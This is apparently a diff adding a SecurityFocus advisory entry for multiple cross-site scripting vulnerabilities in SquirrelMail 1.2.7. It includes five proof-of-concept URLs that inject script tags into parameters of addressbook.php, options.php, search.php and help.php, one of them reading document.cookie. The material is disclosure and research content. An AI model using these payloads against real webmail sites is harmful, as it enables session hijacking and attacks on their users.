@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/5763/info
+
+SquirrelMail is a feature rich webmail program implemented in the PHP4 language. It is available for Linux and Unix based operating systems.
+
+Multiple cross site scripting vulnerabilities have been discovered in various PHP scripts included with SquirrelMail. By including embedded commands into a malicious link, it is possible for an attacker to execute HTML and script code on a web client in the context of the site hosting the webmail system.
+
+This issue was reported for SquirrelMail 1.2.7, earlier versions may also be affected. 
+
+
+http://<VULNERABLE
+SITE>.net/webmail/src/addressbook.php?"><script>alert(document.cookie)</scri
+pt><!--
+
+http://<VULNERABLE
+SITE>.net/webmail/src/options.php?optpage=<script>alert('boop!')</script>
+
+http://<VULNERABLE
+SITE>.net/webmail/src/search.php?mailbox=<script>alert('boop!')</script>&wha
+t=x&where=BODY&submit=Search
+
+http://<VULNERABLE
+SITE>.net/webmail/src/search.php?mailbox=INBOX&what=x&where=<script>alert('b
+oop!')</script>&submit=Search
+
+http://<VULNERABLE
+SITE>.net/webmail/src/help.php?chapter=<script>alert('boop!')</script> 
